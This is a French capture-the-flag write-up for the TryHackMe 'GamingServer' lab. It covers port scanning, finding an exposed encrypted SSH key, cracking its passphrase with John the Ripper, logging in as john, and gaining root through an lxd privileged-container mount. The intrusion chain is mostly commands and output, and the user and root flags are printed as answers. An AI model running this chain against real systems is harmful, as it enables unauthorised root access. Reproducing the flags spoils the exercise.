# GamingServer #

## Task 1 Boot2Root ##

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.221.186 gamingserver.thm' >> /etc/hosts"
[sudo] Mot de passe de tim : 

tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A gamingserver.thm -p- 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-06 08:46 CEST
Nmap scan report for gamingserver.thm (10.10.221.186)
Host is up (0.032s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/6%OT=22%CT=1%CU=34777%PV=Y%DS=2%DC=T%G=Y%TM=610CDAFD
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST11
OS:NW6%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(
OS:R=Y%DF=Y%T=40%W=F507%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   31.93 ms 10.9.0.1
2   32.27 ms gamingserver.thm (10.10.221.186)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.01 seconds

```

Nmap nous montre qu'il a deux services :   
Le service SSH sur le port 22.   
Le service HTTP sur le port 80.    

 ![page1](./Task1-01.png)

 On tombe sur une simple page avec pas grand chose.    

```bash
tim@kali:~/Bureau/tryhackme/write-up$ curl http://gamingserver.thm -s | grep -F '<!--'
<!-- Website template by freewebsitetemplates.com -->
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```

Dans les commentaires dans le code source de la page d'accueil on trouve un nom.   
Cela nous servira plus tard.   
Nom : John  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ gobuster dir -u http://gamingserver.thm -w /usr/share/dirb/wordlists/common.txt -q
/.hta                 (Status: 403) [Size: 281]
/.htaccess            (Status: 403) [Size: 281]
/.htpasswd            (Status: 403) [Size: 281]
/index.html           (Status: 200) [Size: 2762]
/robots.txt           (Status: 200) [Size: 33]  
/secret               (Status: 301) [Size: 321] [--> http://gamingserver.thm/secret/]
/server-status        (Status: 403) [Size: 281]                                      
/uploads              (Status: 301) [Size: 322] [--> http://gamingserver.thm/uploads/]
```

Avec Gobuster on trouve un répertoire \/secret     

![page2](./Task1-02.png)

On trouve clef.    

``tim@kali:~/Bureau/tryhackme/write-up$ wget  http://gamingserver.thm/secret/secretKey -nv
2021-08-06 09:02:57 URL:http://gamingserver.thm/secret/secretKey [1766/1766] -> "secretKey" [1]
`bash

tim@kali:~/Bureau/tryhackme/write-up$ cat secretKey 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
-----END RSA PRIVATE KEY-----
```

On télécharge une clef, on voit que c'est une clef privée.    

```bash
tim@kali:~/Bureau/tryhackme/write-up$ /usr/share/john/ssh2john.py secretKey > hash

tim@kali:~/Bureau/tryhackme/write-up$ john hash -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (secretKey)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:02 DONE (2021-08-06 09:06) 0.3389g/s 4861Kp/s 4861Kc/s 4861KC/sa6_123..*7¡Vamos!
Session completed
```

On trouve me mot passe de la clef privée avec john th ripper.    
Mot de passe : letmein

**What is the user flag?**

```bash
tim@kali:~/Bureau/tryhackme/write-up$ chmod 600 secretKey 

tim@kali:~/Bureau/tryhackme/write-up$ ssh john@gamingserver.thm -i secretKey 
Enter passphrase for key 'secretKey': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Aug  6 07:10:07 UTC 2021

  System load:  0.0               Processes:           97
  Usage of /:   41.1% of 9.78GB   Users logged in:     0
  Memory usage: 32%               IP address for eth0: 10.10.221.186
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10

john@exploitable:~$ cat user.txt
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e

```

On se connect au shell avec notre mot de passe et notre nom d'utilisateur.     
On trouve le flag dans user.txt.    

La réponse est : a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e    


**What is the root flag?**

```bash
john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

On voit john appartient au groupe lxd, on est dans un conteneur.     


```bash
tim@kali:~/Bureau/tryhackme/write-up$ rm alpine-minirootfs-3.14.1-x86_64.tar.gz 
tim@kali:~/Bureau/tryhackme/write-up$ rm -rf lxd-alpine-builder/
tim@kali:~/Bureau/tryhackme/write-up$ git clone https://github.com/saghul/lxd-alpine-builder
Clonage dans 'lxd-alpine-builder'...
remote: Enumerating objects: 35, done.
remote: Counting objects: 100% (8/8), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 35 (delta 2), reused 2 (delta 0), pack-reused 27
Réception d'objets: 100% (35/35), 21.69 Kio | 925.00 Kio/s, fait.
Résolution des deltas: 100% (8/8), fait.
tim@kali:~/Bureau/tryhackme/write-up$ cd lxd-alpine-builder/
tim@kali:~/Bureau/tryhackme/write-up/lxd-alpine-builder$ ls
build-alpine  LICENSE  README.md

tim@kali:~/Bureau/tryhackme/write-up/lxd-alpine-builder$ sudo sh ./build-alpine
[sudo] Mot de passe de tim : 
Determining the latest release... v3.14
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.14/main/x86_64
Downloading apk-tools-static-2.12.7-r0.apk
tar: Le mot clé inconnu « APK-TOOLS.checksum.SHA1 » pour l'en-tête étendu a été ignoré
tar: Le mot clé inconnu « APK-TOOLS.checksum.SHA1 » pour l'en-tête étendu a été ignoré
Downloading alpine-keys-2.3-r1.apk
tar: Le mot clé inconnu « APK-TOOLS.checksum.SHA1 » pour l'en-tête étendu a été ignoré
tar: Le mot clé inconnu « APK-TOOLS.checksum.SHA1 » pour l'en-tête étendu a été ignoré
tar: Le mot clé inconnu « APK-TOOLS.checksum.SHA1 » pour l'en-tête étendu a été ignoré
tar: Le mot clé inconnu « APK-TOOLS.checksum.SHA1 » pour l'en-tête étendu a été ignoré
tar: Le mot clé inconnu « APK-TOOLS.checksum.SHA1 » pour l'en-tête étendu a été ignoré
tar: Le mot clé inconnu « APK-TOOLS.checksum.SHA1 » pour l'en-tête étendu a été ignoré
tar: Le mot clé inconnu « APK-TOOLS.checksum.SHA1 » pour l'en-tête étendu a été ignoré
tar: Le mot clé inconnu « APK-TOOLS.checksum.SHA1 » pour l'en-tête étendu a été ignoré
tar: Le mot clé inconnu « APK-TOOLS.checksum.SHA1 » pour l'en-tête étendu a été ignoré
tar: Le mot clé inconnu « APK-TOOLS.checksum.SHA1 » pour l'en-tête étendu a été ignoré
tar: Le mot clé inconnu « APK-TOOLS.checksum.SHA1 » pour l'en-tête étendu a été ignoré
tar: Le mot clé inconnu « APK-TOOLS.checksum.SHA1 » pour l'en-tête étendu a été ignoré
tar: Le mot clé inconnu « APK-TOOLS.checksum.SHA1 » pour l'en-tête étendu a été ignoré
tar: Le mot clé inconnu « APK-TOOLS.checksum.SHA1 » pour l'en-tête étendu a été ignoré
tar: Le mot clé inconnu « APK-TOOLS.checksum.SHA1 » pour l'en-tête étendu a été ignoré
tar: Le mot clé inconnu « APK-TOOLS.checksum.SHA1 » pour l'en-tête étendu a été ignoré
tar: Le mot clé inconnu « APK-TOOLS.checksum.SHA1 » pour l'en-tête étendu a été ignoré
tar: Le mot clé inconnu « APK-TOOLS.checksum.SHA1 » pour l'en-tête étendu a été ignoré
tar: Le mot clé inconnu « APK-TOOLS.checksum.SHA1 » pour l'en-tête étendu a été ignoré
tar: Le mot clé inconnu « APK-TOOLS.checksum.SHA1 » pour l'en-tête étendu a été ignoré
tar: Le mot clé inconnu « APK-TOOLS.checksum.SHA1 » pour l'en-tête étendu a été ignoré
tar: Le mot clé inconnu « APK-TOOLS.checksum.SHA1 » pour l'en-tête étendu a été ignoré
tar: Le mot clé inconnu « APK-TOOLS.checksum.SHA1 » pour l'en-tête étendu a été ignoré
alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub: Réussi
Verified OK
--2021-08-06 10:16:51--  http://alpine.mirror.wearetriple.com/MIRRORS.txt
Résolution de alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)… 93.187.10.106, 2a00:1f00:dc06:10::106
Connexion à alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)|93.187.10.106|:80… connecté.
requête HTTP transmise, en attente de la réponse… 200 OK
Taille : 2169 (2,1K) [text/plain]
Sauvegarde en : « /home/tim/Bureau/tryhackme/write-up/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt »

/home/tim/Bureau/tryhackme/write-up/lxd-alpine-builder/root 100%[=========================================================================================================================================>]   2,12K  --.-KB/s    ds 0s      

2021-08-06 10:16:52 (69,0 MB/s) — « /home/tim/Bureau/tryhackme/write-up/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt » sauvegardé [2169/2169]

Selecting mirror http://mirror.fit.cvut.cz/alpine//v3.14/main
fetch http://mirror.fit.cvut.cz/alpine//v3.14/main/x86_64/APKINDEX.tar.gz
(1/20) Installing musl (1.2.2-r3)
(2/20) Installing busybox (1.33.1-r3)
Executing busybox-1.33.1-r3.post-install
(3/20) Installing alpine-baselayout (3.2.0-r16)
Executing alpine-baselayout-3.2.0-r16.pre-install
Executing alpine-baselayout-3.2.0-r16.post-install
(4/20) Installing ifupdown-ng (0.11.3-r0)
(5/20) Installing openrc (0.43.3-r1)
Executing openrc-0.43.3-r1.post-install
(6/20) Installing alpine-conf (3.12.0-r0)
(7/20) Installing libcrypto1.1 (1.1.1k-r0)
(8/20) Installing libssl1.1 (1.1.1k-r0)
(9/20) Installing ca-certificates-bundle (20191127-r5)
(10/20) Installing libretls (3.3.3p1-r2)
(11/20) Installing ssl_client (1.33.1-r3)
(12/20) Installing zlib (1.2.11-r3)
(13/20) Installing apk-tools (2.12.7-r0)
(14/20) Installing busybox-suid (1.33.1-r3)
(15/20) Installing busybox-initscripts (3.2-r2)
Executing busybox-initscripts-3.2-r2.post-install
(16/20) Installing scanelf (1.3.2-r0)
(17/20) Installing musl-utils (1.2.2-r3)
(18/20) Installing libc-utils (0.7.2-r3)
(19/20) Installing alpine-keys (2.3-r1)
(20/20) Installing alpine-base (3.14.1-r0)
Executing busybox-1.33.1-r3.trigger
OK: 9 MiB in 20 packages


```

On clone le dépot qui permet la création d'une image alpine.    
On crée l'image.  

```bash
tim@kali:~/Bureau/tryhackme/write-up/lxd-alpine-builder$ ls
alpine-v3.14-x86_64-20210806_1016.tar.gz  build-alpine  LICENSE  README.md
tim@kali:~/Bureau/tryhackme/write-up/lxd-alpine-builder$ cd ..
tim@kali:~/Bureau/tryhackme/write-up$ scp -i secretKey lxd-alpine-builder/alpine-v3.14-x86_64-20210806_1016.tar.gz   john@gamingserver.thm:~
Enter passphrase for key 'secretKey': 
alpine-v3.14-x86_64-20210806_1016.tar.gz                                                                  
```

On transfer l'image sur notre cible.    

```bash
john@exploitable:~$ ls
alpine-v3.14-x86_64-20210806_1016.tar.gz  user.txt
john@exploitable:~$ lxc image import ./alpine-v3.14-x86_64-20210806_1016.tar.gz --alias myimage
Image imported with fingerprint: 271abc9a560830da4c3d12cf8009526a09f0ce431820115ab014085915a54998
```

On donne un nom à notre conteneur.   

```bash
john@exploitable:~$ lxc image list 
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| myimage | 271abc9a5608 | no     | alpine v3.14 (20210806_10:16) | x86_64 | 3.09MB | Aug 6, 2021 at 8:19am (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
```

On voit que notre image est là.  


```bash
john@exploitable:~$ lxc init myimage ignite -c security.privileged=true
Creating ignite
```

Initialisation de l'image.   

```bash
john@exploitable:~$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
```

On monte la répertoire racine dans notre image dans le chemin \/mnt\/root     

```bash
john@exploitable:~$ lxc start ignite
john@exploitable:~$ lxc exec ignite /bin/sh
john@exploitable:~$ lxc exec ignite /bin/sh
~ # id
uid=0(root) gid=0(root)
```

On lance l'image et l'exécute un shell dans l'image et on devient root.    

```bash
~ # cat /mnt/root/root/root.txt 
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
```

Comme \/mnt\/root\/ est la racine de notre shell on trouve le flag dans \/mnt\/root\/root\/root.txt   
On regarde dans le fichier root.txt    

La réponse est : 2e337b8c9f3aff0c2b3e8d4e6a7c88fc    